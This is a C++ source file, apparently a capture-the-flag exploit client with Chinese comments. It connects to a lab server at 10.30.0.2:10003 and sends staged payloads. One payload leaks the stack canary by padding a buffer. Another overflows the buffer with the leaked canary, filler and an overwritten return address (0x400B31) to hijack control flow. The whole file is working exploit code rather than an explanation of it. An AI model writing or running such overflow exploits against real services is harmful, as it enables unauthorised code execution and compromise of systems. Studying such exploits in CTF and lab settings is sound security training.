#include "pwn_link_template.h"
#include <iostream>

int main() 
{
	using pwn_link_template::pe32_t;
	using pwn_link_template::pe64_t;
	using pwn_link_template::skip_chars;

	//----------------------------初始化网络库----------------------------
	pwn_link_template::initglobalNetwork();
	//----------------------------连接到远程服务器----------------------------
	auto handle = pwn_link_template::linktoServer("10.30.0.2", 10003);
	//----------------------------发送数据回调函数设置----------------------------
	pwn_link_template::key_callback["quit"] = [](pwn_link_template::send_stream& data) { data.pos = -1; };
	pwn_link_template::key_callback["pwn1"] = [&handle](pwn_link_template::send_stream& data) {

		data << skip_chars(50) << "\001";
	};
	pwn_link_template::key_callback["pwn2"] = [&handle](pwn_link_template::send_stream& data) {

		data << skip_chars(0x90 - 9);
		data[0x90 - 10] = 'b';
	};
	pwn_link_template::key_callback["pwn3"] = [&handle](pwn_link_template::send_stream& data) {

		handle->_recv_buffer.recv_until("b\n");
		auto a = handle->_recv_buffer.recv(8);
		long long temp = *(long long*)a.data();

		data << skip_chars(0x90 - 8);
		data << static_cast<pe64_t>(temp);
		data << "aaaaaaaa";
		data << static_cast<pe64_t>(0x0000000000400B31);
	};





	//--------------------------等待句柄释放----------------------------
	pwn_link_template::wait_to_close(handle);
	//----------------------------释放网络库----------------------------
	pwn_link_template::releaseglobalNetwork();

	return 0;
}